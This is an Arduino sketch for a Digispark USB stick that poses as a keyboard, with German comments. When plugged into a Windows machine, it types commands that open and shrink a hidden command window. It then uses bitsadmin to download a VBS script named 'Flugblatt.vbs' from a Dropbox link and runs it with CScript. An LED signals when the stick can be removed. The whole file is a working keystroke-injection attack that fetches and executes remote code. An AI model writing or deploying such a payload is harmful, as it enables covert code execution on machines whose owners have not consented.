#include "DigiKeyboard.h"
#define KEY_DOWN_ARROW 0x51
void setup() {
  //turn led off
  pinMode(1, OUTPUT);
  //Starte Eingabe...
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd.exe");//öffnet die Kommandozeile
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("mode con>cols)18 lines)1");//Minimiert das Fenster
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("bitsadmin &transfer wcb &prioritz high https>&&www.dropbox.com&s&jhnviuxgt9s8t7m&Flugblatt.vbs_dl)1 %USERPROFILE%&Flugblatt.vbs");//Downloadet das Flugblatt-Programm 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("CScript %USERPROFILE%&Flugblatt.vbs");//Startet das Flugblatt-Programm
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW, MOD_GUI_LEFT);
  digitalWrite(1, HIGH); //lässt die LED leuchten, wenn man den Stick wieder raus ziehen kann
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

void loop() {
  //Credits to Herolais

}
